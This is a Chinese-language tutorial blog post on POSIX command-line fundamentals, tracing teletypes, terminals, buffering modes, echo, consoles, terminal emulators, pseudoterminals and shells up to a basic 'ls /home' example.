<h2 id="★引子"><a href="#★引子" class="headerlink" title="★引子"></a>★引子</h2><p>　　首先，<br>　　这篇是为了补前几年的“欠债”。这些年，俺写了好多篇 Linux 相关的技术教程。但还从来没有【系统性】地介绍 Linux 命令行相关的基本概念和基本知识。几年来，已经有不少读者催俺填上这个大坑，但俺比较懒，一直拖到现在，惭愧 :(</p>
<h2 id="★本文目标读者"><a href="#★本文目标读者" class="headerlink" title="★本文目标读者"></a>★本文目标读者</h2><p>　　虽然本文的标题号称是【扫盲】，但俺相信：<strong>即使是一些 POSIX 系统的命令行【老手】，对本文中介绍的某些概念，可能也会有【欠缺】。</strong><br>　　因此，这篇教程既适合于命令行的新手，也值得某些【老手】看一看。</p>
<p>　　由于本文介绍的是 POSIX 系统中【通用的】概念与知识。因此，包括 Linux、BSD 家族、macOS 等各种系统的用户，应该都能从中受益。<br>　　（注：<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/POSIX">POSIX</a> 是某种操作系统的标准/规范。各种 Linux 发行版以及所有的 UNIX 变种，包括 macOS，都属于“POSIX 系统”）</p>
<p>　　如果你是这方面的【菜鸟】，并且想要掌握这个领域。【不要】企图只看一遍就完全理解本文的内容（可能需要看好几遍）。俺的建议是：要一边看，一边拿命令行的环境【实践】一下。</p>
<h2 id="★一切都从【电传打字机】开始说起"><a href="#★一切都从【电传打字机】开始说起" class="headerlink" title="★一切都从【电传打字机】开始说起"></a>★一切都从【电传打字机】开始说起</h2><p>　　（说完了“引子”与“目标读者”，开始切入正题）<br>　　可能有些读者会纳闷——“聊命令行的基本概念”，为啥要扯到“电传打字机”？是不是扯得太远了？<br>　　俺来解释一下：<br>　　IT 行业的很多基本概念都来自于【历史遗迹】。有时候你觉得某些东西很奇怪（并纳闷“为啥会设计成这样”）；而当你搞清楚历史的演变过程之后，自然就明白其中的原因。</p>
<h3 id="◇在那遥远的【电报时代】"><a href="#◇在那遥远的【电报时代】" class="headerlink" title="◇在那遥远的【电报时代】"></a>◇在那遥远的【电报时代】</h3><p>　　在计算机诞生之前（二战前），【电报】属于高科技的玩意儿——它能够瞬间把信息传送到另一个城市（甚至传送到大洋彼岸）。<br>　　当年的电报线路，是以【字符】为单位发送信息。在线路两端使用【电传打字机】，就可以自动地把对方发过来的字符打印出来。</p>
<p><img src="https://lh6.googleusercontent.com/SO-SrkxjARZ0k4dADyEbtp9vYYHbv37f1R_iYFZzit2KJjjmeRjLqrXb0gRlHebYTYz1QeT9KzkiJaCneNrhmuBQZaXhlpt2QVDB1N0_3eigwXAZuDmQGq6wmUYjA7zIsyRgxRejW5c" alt="不见图 请翻墙"><br>（上世纪40年代的电传打字机——用于电报网）</p>
<h3 id="◇“回车-换行”的来历"><a href="#◇“回车-换行”的来历" class="headerlink" title="◇“回车/换行”的来历"></a>◇“回车/换行”的来历</h3><p>　　稍微懂点 IT 的同学，应该都听说过“回车/换行”，洋文分别称之为“carriage return”＆“line feed”。在编程领域，这两个字符简称为 <code>\r</code> ＆ <code>\n</code>。<br>　　为啥会有这么两个玩意儿捏？<br>　　因为在电传打字机时代，当打印完一行之后，需要用一个控制命令把“打印头”复位（移到打印纸的左边），然后再用另一个控制命令把“打印头”往下移动一行。很自然地，这俩动作就对应了两个控制字符（CR ＆ LF），也就是所谓的“回车 ＆ 换行”。</p>
<h3 id="◇其它控制字符"><a href="#◇其它控制字符" class="headerlink" title="◇其它控制字符"></a>◇其它控制字符</h3><p>　　如果你去留意一下 ASCII 字符表的开头部分，前面那32个字符都是控制字符，很多都源于遥远的【电报时代】。<br>　　在本文后续的介绍中，还会再聊到这些“控制字符”。</p>
<h2 id="★终端（terminal-TTY）"><a href="#★终端（terminal-TTY）" class="headerlink" title="★终端（terminal/TTY）"></a>★终端（terminal/TTY）</h2><h3 id="◇历史演变"><a href="#◇历史演变" class="headerlink" title="◇历史演变"></a>◇历史演变</h3><p>　　“终端”一词，洋文称之为“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Computer_terminal">terminal</a>”。有时候又被称作 TTY，而 TTY 这个简写就来自刚才介绍的【电传打字机】（teletype printer）。<br>　　因为早期的大型机，其“终端”就是【电传打字机】。那时候的终端，也称作【硬件终端】。</p>
<p>　　为啥会有“终端”这个概念捏？你依然需要了解历史的变迁。<br>　　最早期的计算机（大型机）是【单任务】滴——也就是说，每次只能干一件事情。<br>　　到了60年代，出现了一个【革命性】的飞跃——发明了【多任务】系统，当时叫做“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Time-sharing">time-sharing</a>”（分时系统）。有了“分时系统”，就可以让多个人同时使用一台大型机。而为了让多个人同时操作这台大型机，就引入了【终端】的概念。每一台大型机安装多个终端，每个操作员都在各自的终端上进行操作，互不干扰。</p>
<h3 id="◇（跑题）“约翰·麦卡锡”其人"><a href="#◇（跑题）“约翰·麦卡锡”其人" class="headerlink" title="◇（跑题）“约翰·麦卡锡”其人"></a>◇（跑题）“约翰·麦卡锡”其人</h3><p>　　聊到这里，稍微跑题一下：<br>　　最早的“分时系统”由 IT 超级大牛“约翰·麦卡锡”（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/John_McCarthy_(computer_scientist)">John McCarthy</a>）设计。此人不仅仅是“分时系统它爹”，还是“Lisp 语言它爹”，另外还参与设计了编程语言“ALGOL 60”。而这个“ALGOL 60”编程语言虽然知道的人不多，但该语言深刻影响了后续的 Ada、BCPL、C、Pascal……<br>　　为了让你体会这只大牛到底有多牛。俺引用另一个牛人保罗·格雷汉姆（《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/17i49-SpeKz1wRG5S-HPonO-lXJHD99h62gDsQ64NWXo/">黑客与画家</a>》作者）的观点——他认为在所有编程语言中， Lisp 与 C 是两座无法超越的高峰。而“约翰·麦卡锡”亲自发明了 Lisp 语言，然后又深刻地影响了 C 语言。<br>　　另外，麦卡锡这只大牛还参与创立了“MIT 人工智能实验室”与“斯坦福人工智能实验室”。前者涌现出一大批早期的黑客，其中包括大名鼎鼎的 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Richard_Stallman">Richard Stallman</a>（此人开创了：自由软件运动、GNU 社区、GCC、GDB、GNU Emacs ……）。</p>
<p><img src="https://lh5.googleusercontent.com/0Yiucax8D7skki_Z5csmfmOhFXAc6nUnQfHik6WDoNRMPX4OJeqjq7GZcuHrjYFrBiPmqOunexkfby3c0NI7blTa1d_yDoELrPfIVVYFIHqJLHlQM8X94Ql4IKSyGsKuesGRYbJZKgU" alt="不见图 请翻墙"><br>（超级大牛约翰·麦卡锡）</p>
<h3 id="◇【远程】终端"><a href="#◇【远程】终端" class="headerlink" title="◇【远程】终端"></a>◇【远程】终端</h3><p>　　跑题结束，言归正传。<br>　　“终端”的好处不光是“多任务”，而且还可以让用户在【远程】进行操作。这种情况下，“终端”通过 modem（调制解调器）与“主机”相连。这种玩法很类似于——互联网普及初期的拨号上网。示意图如下：</p>
<p><img src="https://lh5.googleusercontent.com/iUIOjl4GY8O419YJ45c1BN4ri4U2eLJThOEq_Ff_6_gdfGwz76imgEqf6kHp0pgs1iGr0544VL5bTcRGkKaw42mz25Z0vYqEWXhbWwOKS9Y4Nh2UDfN_6LuM-PK1jhtDUtkGbHgV27k" alt="不见图 请翻墙"><br>（通过 modem 实现的【远程】终端）</p>
<p>　　最早的“终端”，本质上就是“电传打字机”——以“打字机”作为输入；以“打印纸”作为输出。这类终端，比较经典的是如下这款：</p>
<p><img src="https://lh3.googleusercontent.com/3tqr5yVvG9QF7vW_J45SWY8aMmGekLQZZNKOP48Vvi9V71qz9v45vbTs25tN6stF13qotXRkyuC_o76FLzYYAbDKzRXFNcSiKnoy5H-6BpRzQ2ZdR9ON1vjdfYYpThUHpthIYv9MoL0" alt="不见图 请翻墙"><br>（Teletype Model 33 ASR）</p>
<p>　　到了上世纪70年初，终于有了带【屏幕】的远程终端。<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Digital_Equipment_Corporation">DEC 公司</a>的 VT05 是第一款基于 CRT 显示器的远程终端。</p>
<p><img src="https://lh3.googleusercontent.com/SDvmTqKHE5lh3PPbrTUGvuX7V8Ux4fv3TdWvB7Ga8BbAVMKUJ8mwn9qp0UqI_6YEDYwhbrEqOWa2M3ifzrTTT5zrpzS-kJwijICRVQDldIfl2W3ra3WQuPxPzWD7I9u8d45z84l04dM" alt="不见图 请翻墙"><br>（VT05 终端）</p>
<h3 id="◇内部结构示意图"><a href="#◇内部结构示意图" class="headerlink" title="◇内部结构示意图"></a>◇内部结构示意图</h3><p>　　下面这张是大型机时代，“终端”与“进程”通讯的示意图。<br>　　图中的 <code>UART</code> 是洋文“Universal Asynchronous Receiver and Transmitter”的缩写（相关维基百科链接在“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Universal_asynchronous_receiver-transmitter">这里</a>”）。LDISC 是洋文“line discipline”的简写（相关维基百科链接在“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Line_discipline">这里</a>”）。<br>　　通俗地说，UART 用来处理物理线路的字符传输（比如：“错误校验”、“流控”、等）；LDISC 用来撮合底层的“硬件驱动”与上层的“系统调用”，并完成某些“控制字符”的处理与翻译。</p>
<p><img src="https://lh3.googleusercontent.com/wzvdclkzzYDah1LxS_lTCQqAbxdePKSr-w1XT7c91axw-_CuT7aATNsEuHxbWBYIOvhbifp8hrwLDkBpOXVQajgX5ZSDfcjvoqjjIpiQVV0EVbaldvA1geO_FHxMe40DMFZ9RfG7iSA" alt="不见图 请翻墙"><br>（TTY 示意图1：使用【硬件终端】的大型机内部结构图）</p>
<h3 id="◇如今的含义"><a href="#◇如今的含义" class="headerlink" title="◇如今的含义"></a>◇如今的含义</h3><p>　　如今，“终端”一词的含义已经扩大了——<strong>用来指：基于【文本】的输入输出机制。</strong><br>　　在本文后续的章节中， terminal 与 TTY 这两个术语基本上是同义词。</p>
<h2 id="★终端的3种【缓冲模式】——字符模式、行模式、屏模式"><a href="#★终端的3种【缓冲模式】——字符模式、行模式、屏模式" class="headerlink" title="★终端的3种【缓冲模式】——字符模式、行模式、屏模式"></a>★终端的3种【缓冲模式】——字符模式、行模式、屏模式</h2><h3 id="◇字符模式（character-mode）"><a href="#◇字符模式（character-mode）" class="headerlink" title="◇字符模式（character mode）"></a>◇字符模式（character mode）</h3><p>　　又要说回到【电传打字机】。<br>　　在本文开头，已经聊过这个玩意儿，并且提到——它是基于【字符】传输滴。也就是说，操作员每次在“电传打字机”上按键，对应的字符会立即通过线路发送给对方。这就是最传统的【字符模式】<br>　　通俗地说，“字符模式”也就是【无缓冲】的模式。</p>
<h3 id="◇行模式（line-mode）"><a href="#◇行模式（line-mode）" class="headerlink" title="◇行模式（line mode）"></a>◇行模式（line mode）</h3><p>　　不客气地说，“字符模式”是非常傻逼滴！因为如果你不小心按错键，这个错误也会立即发送出去。<br>　　比如说，你在输入一串很长的命令，结果输到半当中，敲错一个按键，整个命令就废了——要重新再输入一遍。<br>　　所以，当早期的程序员对“字符模式”实在忍无可忍之后，终于发明了【行模式】。<br>　　【行模式】也叫做“行缓冲”。也就是说，终端会把你当前输入的这行先缓冲在本地。只有当你最终按了【回车键】，才会把这一整行发送出去。如果你不小心敲错了一个字符，可以赶紧用“退格键”删掉重输这个字符。<br>　　因此，这种模式称之为【行缓冲】。</p>
<p>　　顺便说一下：<br>　　早期的标准键盘，【没有】方向键（“上下左右”这4个键）。不信的话，可以去看本文前面贴的那张“Teletype Model 33 ASR”的照片。<br>　　因为无论是“字符模式”还是“行模式”，都没这个需求。</p>
<h3 id="◇屏模式（screen-mode-block-mode）"><a href="#◇屏模式（screen-mode-block-mode）" class="headerlink" title="◇屏模式（screen mode/block mode）"></a>◇屏模式（screen mode/block mode）</h3><p>　　“行模式”进一步的发展就是【屏模式】。这个玩意儿也叫“全屏缓冲”，顾名思义，终端会缓冲当前屏幕的内容。<br>　　在这种模式下，用户可以利用方向键，操纵光标（cursor）在屏幕上四处游走。<br>　　开发这种类型的软件，比较复杂——程序员至少需要做如下工作：<br>\1. 保存整个屏幕的状态<br>\2. 根据键盘输入，操纵光标（cursor）移动<br>\3. 控制屏幕的哪些区域是光标可达，哪些是不可达；<br>\4. 对于光标可达的部分，控制哪些是“可编辑”，哪些是“只读”；<br>\5. 根据“光标移动”以及某些“特定的按键”（比如“翻页键”），重新绘制屏幕<br>……<br>　　后来，为了简化”屏模式“的编程，专门搞了一个叫做 curses 的编程库。如今的“ncurses 库”就是从 curses 衍生出来滴（前面加了一个 n 表示 new）。</p>
<p><img src="https://lh5.googleusercontent.com/nPGfx1VIMvI26G-L4q9jqaw-RYqRLkHIj3vjgOMHzxAFQMHgOEry2YyN4mXFPAxqvNPl4EwqJr0Q34Z9sMl_8HPNmm1eT-FAkJyU8FCJcSPovg8wb3UZJT5CIbdKz-zmeNdX0J2pFvk" alt="不见图 请翻墙"><br>（“重编译 Linux 内核”的配置界面，基于 ncurses 实现）</p>
<p>　　前面说了——早期的键盘【没】方向键。有了这个【屏模式】之后，键盘上才开始增加了“方向键”（所以“方向键”位于键盘的扩展区）</p>
<h3 id="◇小结"><a href="#◇小结" class="headerlink" title="◇小结"></a>◇小结</h3><p>　　上述这三种模式，第1种基本淘汰（仅限于极少数场景）；第3种用得也不多。与本文关系比较密切的，其实是【第2种】——行模式。<br>　　为了加深你的印象，用 <code>cat</code> 命令来举例（注：这个命令其实与“猫”【无关】，而是 concatenate 的简写）<br>　　大部分情况下，都是用它来显示某个文件的内容，比如说：<code>cat 文件名</code> 。但如果你运行 <code>cat</code>【没】加任何参数，那么它就会尝试读取你在终端的输入，然后把读到的文本再原样输出到终端。</p>
<p><img src="https://lh5.googleusercontent.com/PPet_RllllnSmYALmxV56ohy5NZz1kj76GzbmcvM9HJDrqY6h74otCFL1E0rG_lEKnALViM8zv2E4BOj4bUUTixzD_QTTXsmoh0-U3dxJROpiAfvW2vHZ69s2vpYlq88-6FBngqgzSQ" alt="不见图 请翻墙"><br>（动画：演示“行模式”的效果）</p>
<p>　　在上述动画中，你的输入并【没有】直接传递给 <code>cat</code> 进程。要一直等到你按下【回车键】，<code>cat</code> 进程才收到你的输入，并立即打印了输出。</p>
<h2 id="★终端的【回显】"><a href="#★终端的【回显】" class="headerlink" title="★终端的【回显】"></a>★终端的【回显】</h2><h3 id="◇“回显”是啥？"><a href="#◇“回显”是啥？" class="headerlink" title="◇“回显”是啥？"></a>◇“回显”是啥？</h3><p>　　在刚才那个 gif 动画中，当俺逐个输入 <code>test</code> 的每个字母，这些字母也会逐个显示在屏幕上。这种做法叫做【回显】。</p>
<h3 id="◇“回显”的打开与关闭（启用-禁用）"><a href="#◇“回显”的打开与关闭（启用-禁用）" class="headerlink" title="◇“回显”的打开与关闭（启用/禁用）"></a>◇“回显”的打开与关闭（启用/禁用）</h3><p>　　虽然“回显”很人性化，但某些特殊的场合是【不想】“回显”滴，比如当你输入密码/口令的时候。<br>　　因此，终端提供了某种机制，使得程序能够控制“回显”的启用/禁用。<br>　　对于大多数终端，可以用【<code>Ctrl + S</code>】禁用“回显”，然后用【<code>Ctrl + Q</code>】启用“回显”。<br>　　如果你在禁用“回显”的情况下输入一些文本，当你重新启用“回显”的瞬间，这些文本会一起出现在屏幕上。</p>
<p>　　顺便说一下：<br>　　由于【<code>Ctrl + S</code>】在 Windows 上是很常见的组合键。某些菜鸟刚开始玩 Linux 命令行的时候，会习惯性地按这个组合键，结果就禁用了回显。这时候，任何键盘输入都没有反应。菜鸟就以为终端死掉了。</p>
<h3 id="◇历史演变-1"><a href="#◇历史演变-1" class="headerlink" title="◇历史演变"></a>◇历史演变</h3><p>　　对于 Windows 用户来说，【<code>Ctrl + S</code>】实在太常用了，很容易误按。肯定有大量的用户吐槽过 POSIX 终端的这个快捷键。<br>　　那么，为啥要用这两个快捷键来控制“回显”捏？俺又要第 N 次说到【电传打字机】了。<br>　　由于这玩意儿的输出是【打印纸】，其速率比较【慢】。一旦“对方发送字符的速率”高于“自己这边的打印速率”，就需要向对方发一个控制信号，让对方暂停发送；等到自己这边打印完了，再发送另一个控制字符，通知对方继续。<br>　　（注：上述这种玩法，通信领域行话称之为“流量控制/流控”）<br>　　当年用来表示“暂停发送”的控制字符，对应的就是【<code>Ctrl + S</code>】；用来“恢复发送”的控制字符，也正是【<code>Ctrl + Q</code>】。</p>
<h2 id="★（早期的）系统控制台-物理控制台（system-console）"><a href="#★（早期的）系统控制台-物理控制台（system-console）" class="headerlink" title="★（早期的）系统控制台/物理控制台（system console）"></a>★（早期的）系统控制台/物理控制台（system console）</h2><p>　　（前面说了）在【没】发明“分时系统”之前，当时的计算机只能执行【单任务】。因此，那时候的大型机只有【一个】操作界面，称之为【控制台】。<br>　　话说那时的“控制台”，真的是一个台子（参见下图）。</p>
<p><img src="https://lh3.googleusercontent.com/vc0kCy3x_3ds8LNeFUpgcE7HljoCBVAD1T-857bjeMUGIBweBrX32gZ27A5c7I2ChXLOljlh3h8_1iIYp39EvlNSn9w5x5zu5CTxWlO6W1aBV6qilF9pt0aq7MXCcZkq2SHMKS_5pt8" alt="不见图 请翻墙"><br>（上世纪50年代，IBM 公司 704 大型机的控制台）</p>
<p>　　后来发明了“分时系统”。如刚才所说——“分时系统”使得大型机可以具备多个终端。在这种情况下，你可以把“控制台”通俗地理解为“本地终端”，而【不】是“控制台”的那些终端，称之为“远程终端”。<br>　　在那个年代，计算机属于【非常非常稀缺】的资源。于是拥有大型机的公司，就可以【出租计算资源】，获得一笔相当可观的收入。他们把大型机的某个“远程终端”租给外来人员使用，然后根据“时间/空间”收取费用。由于资源的稀缺性，当年的 CPU 是按【秒】计费，而内存是按【KB】计费。<br>　　由于“远程终端”可能会被【外人】使用，因此对“远程终端”的【权限】要进行一些限制。如果要进行一些高级别的操作（比如“关闭整个系统”），就只能限制在【控制台】（本地终端）进行。有些公司为了安全起见，还会把“控制台”单独锁在某个“secured room”里面。</p>
<p><img src="https://lh3.googleusercontent.com/5AlRxQhR00CvQ3DSO-idsyShNRJAOMIGL1J5I3b1UE1kW1dZVE5gU8mBenZUF_DMxwi0nHYd6ju7J6JsdApfarb3E_1_jBJQ2fL4SMm60k34xVToDm41jWoHfZOY32nZEhJW247zx3U" alt="不见图 请翻墙"><br>（上世纪60年代，DEC 公司 PDP-7 小型机的控制台）</p>
<h2 id="★（如今的）虚拟控制台（virtual-console）"><a href="#★（如今的）虚拟控制台（virtual-console）" class="headerlink" title="★（如今的）虚拟控制台（virtual console）"></a>★（如今的）虚拟控制台（virtual console）</h2><p>　　到了 PC 时代，传统意义上的【控制台】已经看不到了。但 console 这个术语保留了下来。</p>
<h3 id="◇从“物理-console”到“虚拟-console”"><a href="#◇从“物理-console”到“虚拟-console”" class="headerlink" title="◇从“物理 console”到“虚拟 console”"></a>◇从“物理 console”到“虚拟 console”</h3><p>　　早期大型机的 console 是【独占】硬件滴——“键盘/显示器”固定用于某个 console 滴。<br>　　【现代】的 POSIX 系统，衍生出“virtual console”的概念——可以让几个不同的 console【共用】一套硬件（键盘/显示器）。“virtual”一词就是这么来滴。<br>　　再重复唠叨一下：不论是早期的“物理控制台”还是后来的“虚拟控制台”，都属于广义上的“终端”。</p>
<h3 id="◇举例：Linux-的-virtual-console"><a href="#◇举例：Linux-的-virtual-console" class="headerlink" title="◇举例：Linux 的 virtual console"></a>◇举例：Linux 的 virtual console</h3><p>　　假设你的 Linux 系统没安装图形界面（或者默认不启用图形界面），当系统启动完成之后，你会在屏幕上看到一个文本模式的登录提示。这个界面就是 virtual console 的界面。<br>　　在默认情况下，Linux 内置了【6个】virtual console 用于命令行操作，然后把第7个 virtual console 预留给图形系统。你可以使用 <code>Alt + Fn</code> 或 <code>Ctrl + Alt + Fn</code> 在这几个 console 之间切换（注：上述所说的 <code>Fn</code> 指的是 F1、F2… 之类的功能键）。</p>
<h3 id="◇虚拟控制台的【内部结构】"><a href="#◇虚拟控制台的【内部结构】" class="headerlink" title="◇虚拟控制台的【内部结构】"></a>◇虚拟控制台的【内部结构】</h3><p><img src="https://lh6.googleusercontent.com/8rNRQNmIjTgBgt2N9RQQuzPJ4FP-03PcZfURXegbfEWowJ2XpAVNm3beOKXEVOJIbFmrDUQi3EqylMhxr2igKvHVp95rP1cyKgtl8He00YemHrCUAtOzjZSE48C6bkWibmun8pJFOEI" alt="不见图 请翻墙"><br>（TTY 示意图2：【虚拟控制台】的内部结构图）</p>
<h2 id="★终端模拟器（terminal-emulator）"><a href="#★终端模拟器（terminal-emulator）" class="headerlink" title="★终端模拟器（terminal emulator）"></a>★终端模拟器（terminal emulator）</h2><p>　　请注意上面那张示意图，图中出现了一个【终端模拟器】，这就是本章节要说的东东。<br>　　如果你对比前面的【TTY 示意图1】与【TTY 示意图2】的变化，会发现——“UART ＆ UART 驱动”没了，然后多了这个【终端模拟器】。<br>　　多出来的这个玩意儿相当于加了一个【抽象层】，模拟出早期硬件终端的效果，因此就【无需改动】系统内核中的其它部分，比如：LDISC（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Line_discipline">line discipline</a>）<br>　　请注意，这个场景下的“终端模拟器”位于操作系统【内核】。换句话说，它属于【内核态】的模拟器。正是因为它处于这个地位，所以能够在“驱动”＆“LDISC”之间进行协调。</p>
<h2 id="★伪终端（PTY-pseudotty-pseudoterminal）"><a href="#★伪终端（PTY-pseudotty-pseudoterminal）" class="headerlink" title="★伪终端（PTY/pseudotty/pseudoterminal）"></a>★伪终端（PTY/pseudotty/pseudoterminal）</h2><h3 id="◇从“文本模式”到“图形模式”"><a href="#◇从“文本模式”到“图形模式”" class="headerlink" title="◇从“文本模式”到“图形模式”"></a>◇从“文本模式”到“图形模式”</h3><p>　　前面讲的那些，都是【文本模式】（文本界面）。<br>　　话说到了上世纪80年代，随着【图形界面】的兴起，就出现某种需求——想在图形界面下使用“【文本】终端”。于是就出现了“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Pseudoterminal">伪终端</a>”的概念。<br>　　通俗地说，“伪终端”就是用某个图形界面的软件来模拟传统的“文本终端”的各种行为。前面说了，TTY 这个缩写相当于“终端”的同义词；因此“pseudotty” 就衍生出 PTY 这个缩写。</p>
<h3 id="◇从“【内核态】终端模拟器”到“【用户态】终端模拟器”"><a href="#◇从“【内核态】终端模拟器”到“【用户态】终端模拟器”" class="headerlink" title="◇从“【内核态】终端模拟器”到“【用户态】终端模拟器”"></a>◇从“【内核态】终端模拟器”到“【用户态】终端模拟器”</h3><p>　　在上一个章节中，emulator 运行在系统内核中，因此是“内核态模拟器”；<br>　　等到后来搞“伪终端”的时候，就直接把这个玩意儿从【内核态】转到【用户态】——让它直接运行在【桌面环境】。如此一来，用户就可以直接在桌面环境中使用“终端模拟器”。<br>　　当“终端模拟器”变为【用户态】，它就【无法】直接与“键盘驱动 or 显卡驱动”打交道。在这种情况下，由“GUI 系统”（比如：X11）负责与这些驱动打交道，然后再把用户的输入输出转交给“终端模拟器”。</p>
<p>　　下面这张示意图是 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Xterm">xterm</a>。别看它长得丑，它的出现也算是“里程碑”了。</p>
<p><img src="https://lh5.googleusercontent.com/2GRHQZetZPor718nRQB0D4JPscPyssaw4c2ufUOa-EF73PWb-SmTFNJYjILwZ5znmpzX6qEdHrT5-1R83TmZAKUVzr4IhfdRMYmpZQmZC16qqIcaaJOESrJUX798-qtrtUSIE9lEUH4" alt="不见图 请翻墙"><br>（xterm——“图形化终端模拟器”的祖师爷）</p>
<h3 id="◇内部结构示意图-1"><a href="#◇内部结构示意图-1" class="headerlink" title="◇内部结构示意图"></a>◇内部结构示意图</h3><p>　　很多人把“emulator”与“PTY”混为一谈。实际上两者处于【不同】层次。<br>　　在操作系统内部（内核），PTY 分为两部分实现，分别叫做“PTY master” ＆ “PTY slave”。master 负责与“terminal emulator”打交道；而用户通过 emulator 里面的 shell 启动的其它进程，则与 slave 打交道。<br>　　在这个环节中，“PTY slave”又进一步缩写为“PTS”。如果你用 <code>ps</code> 命令查看系统中的所有进程，经常会看到 PTS 之类的字样，指的就是这个玩意儿。对普通用户而言，看到的是“终端模拟器”的界面，至于 PTY 内部的 master ＆ slave，通常是感觉不到滴。</p>
<p>　　为了让大伙儿更加直观，再放一张 PTY 的结构示意图。</p>
<p><img src="https://lh6.googleusercontent.com/58f8TOJpw7rR6_oGBLI9nVPiW1jBVddKBH30UTzWL3n8pyY4RSvF19SAJK-lkymlteMNeyffOHDXOXKYnHehTF2-2Hep1Q4bhwBTHdDkax3uDy1kR-3a75DvxvH-LD2ggRTXUojHmy4" alt="不见图 请翻墙"><br>（TTY 示意图3：【伪终端】的内部结构图）</p>
<h2 id="★shell——命令行解释器"><a href="#★shell——命令行解释器" class="headerlink" title="★shell——命令行解释器"></a>★shell——命令行解释器</h2><p>　　费了好多口水，咱们终于聊到 shell 了。<br>　　顺便吐槽一下：<br>　　扫盲命令行的教程，很少会像俺这样，从最基本的概念说起。其导致的后果就是——很多人（甚至包括很多 Linux 程序员）都搞不清“shell、terminal、console、TTY、PTY、PTS”这些概念到底有啥区别。<br>　　在《<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2019/10/Systematic-Learning.html">如何【系统性学习】——从“媒介形态”聊到“DIKW 模型”</a>》一文中，俺特别强调了【基本概念/基础知识】的重要性。这也就是俺为啥前面要费这么多口水的原因。</p>
<h3 id="◇shell-VS-terminal"><a href="#◇shell-VS-terminal" class="headerlink" title="◇shell VS terminal"></a>◇shell VS terminal</h3><p>　　前面所说的“终端”（terminal），本质上是：<strong>基于【文本】的输入输出机制</strong>。它并【不】理解具体的命令及其语法。<br>　　于是就需要引入 shell 这个玩意儿——shell 负责解释你输入的命令，并根据你输入的命令，执行某些动作（包括：启动其它进程）。</p>
<h3 id="◇常见-shell-举例"><a href="#◇常见-shell-举例" class="headerlink" title="◇常见 shell 举例"></a>◇常见 shell 举例</h3><p>　　常见的 shell 包括如下这些（为避免排名纠纷，按字母序列出）：</p>
<blockquote>
<p>bash<br>csh<br>fish<br>ksh<br>zsh</p>
</blockquote>
<p>　　在维基百科的“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Comparison_of_command_shells">这个页面</a>”，列出了各种各样的 shell 及其功能特性的对照表。<br>　　如今影响力最大的 shell 是 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Bash_(Unix_shell)">bash</a>（没有之一）。其名称源自“Bourne-again shell”，是 GNU 社区对 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Bourne_shell">Bourne shell</a> 的重写，使之符合自由软件（GPL 协议）。<br>　　本文后续章节对 shell 的举例，如果没有做特殊说明，均指 bash 这个 shell。</p>
<h2 id="★shell-的基本功能"><a href="#★shell-的基本功能" class="headerlink" title="★shell 的基本功能"></a>★shell 的基本功能</h2><h3 id="◇显示【命令行提示符】"><a href="#◇显示【命令行提示符】" class="headerlink" title="◇显示【命令行提示符】"></a>◇显示【命令行提示符】</h3><p>　　当你打开一个 shell，会看闪烁的光标左侧显示一个东东，那个玩意儿就是【命令行提示符】（参见下图）</p>
<p><img src="https://lh5.googleusercontent.com/q5gzYkmF9TWwGKHNRJKXgE2EhnVrHdCuKSb_bij_33qGNGlHgLCg-FUmFqTGG0ySOa2r7ftvwcW8H1p1CwnGt_9F9q1Kb2PeeZlACYUk5B540yV0AxoLDcfaeSjjT62NeuEGh2hlYi8" alt="不见图 请翻墙"><br>（截图中的“命令行提示符”包含了：用户名、当前路径、$分隔符）</p>
<p>　　很多 shell 的“命令行提示符”都会包含【当前路径】。当你用 <code>cd</code> 命令切换目录，提示符也会随之改变。这有助于你搞清楚当前在哪个目录下，<strong>可以有效避免误操作</strong>。<br>　　下面这张图演示了——“命令行提示符”随着当前目录的变化而变化。</p>
<p><img src="https://lh6.googleusercontent.com/RY0bVcLsYb8NFwMCu2XFeYEtaNopq9mI-XHZguPCFF7ojalynKSebm1LWVrENzZk_8msixbqyzGae8y5MxysSu2Q_GNl7N9l8AGt9ltXwsr5nUt-XWIuQH0l-scWPyO0qkm-y_D1oJs" alt="不见图 请翻墙"></p>
<p>　　大部分 shell 都可以让你自定义这个【命令行提示符】，使之显示更多的信息量。<br>　　比如说，可以让它显示：当前的时间、主机名、上一个命令的退出码……<br>　　（注：如果你需要开多个【远程】终端，去操作多个【不同】的系统，“主机名”就蛮有用）</p>
<h3 id="◇解析用户输入的【命令行】"><a href="#◇解析用户输入的【命令行】" class="headerlink" title="◇解析用户输入的【命令行】"></a>◇解析用户输入的【命令行】</h3><p>　　假设你想看一下 <code>/home</code> 这个目录下有哪些子目录，可以在 shell 中运行了如下命令：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">ls</span> <span class="hljs-string">/home</span><br></code></pre></td></tr></table></figure>

<p>　　当你输入这串命令并敲回车键，shell 会拿到这一行，然后它会分析出，空格前面的 <code>ls</code> 是一个外部命令，空格后面的 <code>/home</code> 是该命令的参数。<br>　　然后 shell 会启动这个外部命令对应的进程，并把上述参数作为该进程的启动参数。</p>
